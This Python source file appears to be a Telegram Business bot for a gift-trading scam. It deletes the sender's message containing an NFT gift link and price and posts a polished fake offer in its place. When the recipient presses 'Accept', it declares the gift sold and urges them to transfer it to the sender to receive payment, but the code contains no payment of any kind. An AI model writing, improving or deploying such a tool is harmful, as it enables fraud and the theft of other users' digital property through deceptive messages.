import re
import uuid
from aiogram import Router, F, Bot
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, 
    InlineKeyboardButton, LinkPreviewOptions
)
from aiogram.enums import ParseMode
from html import escape

router = Router()

# Временное хранилище офферов
active_offers = {}

# Регулярки
NFT_LINK_RE = re.compile(r"(?:https?://)?t\.me/nft/[^\s]+", re.IGNORECASE)
PRICE_RE = re.compile(r"(?:^|\s)(\d+(?:[.,]\d+)?)\s*(gram|ton|stars|star|rub|usdt)?", re.IGNORECASE)
# Регулярка для поиска языка (en, cn, ru)
LANG_RE = re.compile(r"(?:^|\s)(en|cn|ru)(?=\s|$)", re.IGNORECASE)

# ТВОИ ПРЕМИУМ-ЭМОДЗИ
EMOJI_IDS = {
    "💎": "5264766603584641330",
    "⭐️": "5958376256788502078",
    "🎁": "6032937473162614352",
    "✅": "5985596818912712352",
    "❌": "5985346521103604145"
}

# СЛОВАРИ ПЕРЕВОДОВ
LOCALES = {
    "ru": {
        "offer": "Пользователь <b>{user}</b> предлагает Вам <b>{price}</b> за подарок <a href=\"{link}\">{gift}</a>.",
        "accept": "Принять",
        "decline": "Отклонить",
        "sold": "🎁 Подарок: <a href=\"{link}\">{gift}</a> успешно продан!\n\nПередайте подарок покупателю для зачисления <b>{price}</b>.",
        "transfer": "Передать подарок",
        "how_to": "Как передать?",
        "alert": "Нажмите «Передать подарок» под сообщением.\n\nВ открывшемся окне подтвердите передачу подарка.",
        "declined": "<b>❌ Предложение отклонено.</b>"
    },
    "en": {
        "offer": "User <b>{user}</b> offers you <b>{price}</b> for the gift <a href=\"{link}\">{gift}</a>.",
        "accept": "Accept",
        "decline": "Decline",
        "sold": "🎁 Gift: <a href=\"{link}\">{gift}</a> successfully sold!\n\nTransfer the gift to the buyer to receive <b>{price}</b>.",
        "transfer": "Transfer gift",
        "how_to": "How to transfer?",
        "alert": "Click \"Transfer gift\" under the message.\n\nConfirm the transfer in the window that opens.",
        "declined": "<b>❌ Offer declined.</b>"
    },
    "cn": {
        "offer": "用户 <b>{user}</b> 向您提供 <b>{price}</b> 购买礼物 <a href=\"{link}\">{gift}</a>。",
        "accept": "接受",
        "decline": "拒绝",
        "sold": "🎁 礼物：<a href=\"{link}\">{gift}</a> 成功售出！\n\n请将礼物转移给买家以获取 <b>{price}</b>。",
        "transfer": "转移礼物",
        "how_to": "如何转移？",
        "alert": "点击消息下方的“转移礼物”。\n\n在弹出的窗口中确认转移。",
        "declined": "<b>❌ 报价已拒绝。</b>"
    }
}

def premiumize_html(text: str) -> str:
    """Превращает обычные эмодзи в премиум-теги"""
    for emoji, emoji_id in EMOJI_IDS.items():
        text = text.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return text

# 1. Отправка оффера
@router.business_message(F.chat.type == "private")
async def handle_business_message(message: Message, bot: Bot):
    if not message.text:
        return
        
    link_match = NFT_LINK_RE.search(message.text)
    price_match = PRICE_RE.search(message.text)
    lang_match = LANG_RE.search(message.text)
    
    if not link_match or not price_match:
        return
        
    link = link_match.group(0)
    if not link.startswith("https://"):
        link = "https://" + link
        
    amount = price_match.group(1)
    currency = (price_match.group(2) or "").lower()
    
    # Определяем язык (если не нашли, ставим ru)
    lang = lang_match.group(1).lower() if lang_match else "ru"
    if lang not in LOCALES:
        lang = "ru"
    t = LOCALES[lang] # Словарь с переводом для текущего языка
    
    # Логика пробелов (грамы с пробелом, звезды без)
    if currency in ["gram", "ton"]:
        price = f"{amount} 💎"
    elif currency in ["stars", "star", ""]:
        price = f"{amount}⭐️"
    else:
        price = f"{amount} {currency.upper()}"
    
    gift_slug = link.split("/")[-1]
    gift_name = gift_slug.replace("-", " #")
    
    buyer_name = message.from_user.first_name or message.from_user.full_name or "User"
    buyer_username = message.from_user.username
    buyer_id = message.from_user.id
    
    offer_id = str(uuid.uuid4())[:8]
    
    active_offers[offer_id] = {
        "link": link,
        "price": price,
        "gift_name": gift_name,
        "buyer_username": buyer_username,
        "buyer_id": buyer_id,
        "lang": lang  # Сохраняем язык, чтобы кнопки работали на нем же
    }
    
    # Формируем текст оффера
    text = premiumize_html(t["offer"].format(
        user=escape(buyer_name), 
        price=price, 
        link=link, 
        gift=gift_name
    ))
    
    # Формируем кнопки
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["decline"], 
                callback_data=f"decline:{offer_id}",
                icon_custom_emoji_id=EMOJI_IDS["❌"]
            ),
            InlineKeyboardButton(
                text=t["accept"], 
                callback_data=f"accept:{offer_id}",
                icon_custom_emoji_id=EMOJI_IDS["✅"]
            )
        ]
    ])
    
    link_preview = LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
    
    await bot.send_message(
        chat_id=message.chat.id,
        text=text,
        reply_markup=keyboard,
        business_connection_id=message.business_connection_id,
        parse_mode=ParseMode.HTML,
        link_preview_options=link_preview 
    )
    
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"Не удалось удалить сообщение: {e}")

# 2. Нажатие на кнопку "Принять"
@router.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery, bot: Bot):
    offer_id = callback.data.split(":")[1]
    offer_data = active_offers.get(offer_id)
    
    if not offer_data:
        await callback.answer("❌ Данные устарели / Data expired", show_alert=True)
        return
        
    lang = offer_data.get("lang", "ru")
    t = LOCALES[lang]
    
    link = offer_data["link"]
    price = offer_data["price"]
    gift_name = offer_data["gift_name"]
    
    buyer_username = offer_data.get("buyer_username")
    buyer_id = offer_data.get("buyer_id")
    
    gift_transfer_link = f"tg://send_gift?to={buyer_username}" if buyer_username else f"tg://send_gift?to={buyer_id}"
    
    text = premiumize_html(t["sold"].format(link=link, gift=gift_name, price=price))
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["transfer"], url=gift_transfer_link)],
        [InlineKeyboardButton(text=t["how_to"], callback_data=f"how_to_transfer:{lang}")]
    ])
    
    await bot.edit_message_text(
        text=text,
        chat_id=callback.message.chat.id,
        message_id=callback.message.message_id,
        reply_markup=keyboard,
        business_connection_id=callback.message.business_connection_id,
        parse_mode=ParseMode.HTML,
        link_preview_options=LinkPreviewOptions(show_above_text=True, url=link)
    )
    await callback.answer()

# 3. Нажатие на кнопку "Отклонить"
@router.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery, bot: Bot):
    offer_id = callback.data.split(":")[1]
    offer_data = active_offers.get(offer_id)
    
    lang = offer_data.get("lang", "ru") if offer_data else "ru"
    t = LOCALES[lang]
    
    text = premiumize_html(t["declined"])
    
    await bot.edit_message_text(
        text=text,
        chat_id=callback.message.chat.id,
        message_id=callback.message.message_id,
        business_connection_id=callback.message.business_connection_id,
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

# 4. Всплывающее окно "Как передать?"
@router.callback_query(F.data.startswith("how_to_transfer:"))
async def how_to_transfer(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    t = LOCALES.get(lang, LOCALES["ru"])
    
    await callback.answer(text=t["alert"], show_alert=True)